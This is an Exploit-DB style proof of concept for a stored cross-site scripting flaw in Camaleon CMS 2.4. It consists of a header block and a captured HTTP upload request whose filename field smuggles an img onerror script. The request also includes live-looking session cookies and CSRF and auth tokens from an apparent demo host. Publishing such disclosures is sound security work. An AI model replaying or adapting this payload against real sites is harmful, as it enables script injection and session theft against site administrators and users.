@@ -1,0 +1,30 @@
+# Exploit Title: CAMALEON CMS 2.4 - Cross-Site Scripting
+# Date: 2018-10-11 
+# Exploit Author: Ismail Tasdelen
+# Vendor Homepage: http://camaleon.tuzitio.com/
+# Software Link : https://github.com/owen2345/camaleon-cms
+# Software : CAMALEON CMS
+# Version : 2.4
+# Vulernability Type : Cross-site Scripting
+# Vulenrability : Stored XSS
+# CVE : N/A
+ 
+# HTTP POST Request :
+ 
+POST /admin/media/upload?actions=false HTTP/1.1
+Host: demo-7728.tuzitio.com
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://demo-7728.tuzitio.com/admin/profile/edit
+X-CSRF-Token: D4mT8cg18Rxhpi7fYr9kRRvdCn2dSZXJMbbFeyOynVVMa3aD1pbIXDebhV3B2YwRttvYyoRLRWNf5gGlqX6fNw==
+X-Requested-With: XMLHttpRequest
+Content-Length: 1575324
+Content-Type: multipart/form-data; boundary=---------------------------85707368319206533892056530265
+Cookie: _ga=GA1.2.1784268591.1539231194; _gid=GA1.2.1333106602.1539231194; _tuzitio2_session=RHhIbzhHZTlERjFnM3ZUOTFzMnE5c295TCtVQ0QrUmttVGpCZnljaS9ibVM4UE9Ma0VDR2ppcnQzdlNPZFNobUsxdFhNSER4Z3JXYlBxN3VZcTNEbWRXS0ZldERyLzYyQ3d0S3hwSjhzWjBUMHJmaU1WeEt6MDB2QlQ0S0xkbGhUdkNwUHIrRS81ekJ3T2NnOUdnVXB5KzhPS1BnczNvaUtia2x6bmE3N2pzckRPaWI2Skc1RGhJWnZMbERRREZCSXpkU3pxdTMrRlk5WG5XYUMydk9xb1NRY2lzeWt2TWpwVjNodXJNOHFDZG9yczZXVkFMMXU2KzBZSTVqUGNkcDdjV3dBbmFuOVF3Z3BRRlFLcjFtcjVhK3hpak51VUFScVg3czQ0Z2xoOTg9LS1rczBEeWJsaDJPRkhwaTU3UHFSa2h3PT0%3D--f896a698dc0ad774de6bc953d2b9e460e916300f; auth_token=2ysW1sleUvjMJnzIqwlXag&Mozilla%2F5.0+%28X11%3B+Linux+x86_64%3B+rv%3A60.0%29+Gecko%2F20100101+Firefox%2F60.0&176.41.2.45
+Connection: close
+
+-----------------------------85707368319206533892056530265
+Content-Disposition: form-data; name="file_upload"; filename="\"><img src=x onerror=alert(\"ismailtasdelen\")>.jpg"
+Content-Type: image/jpeg
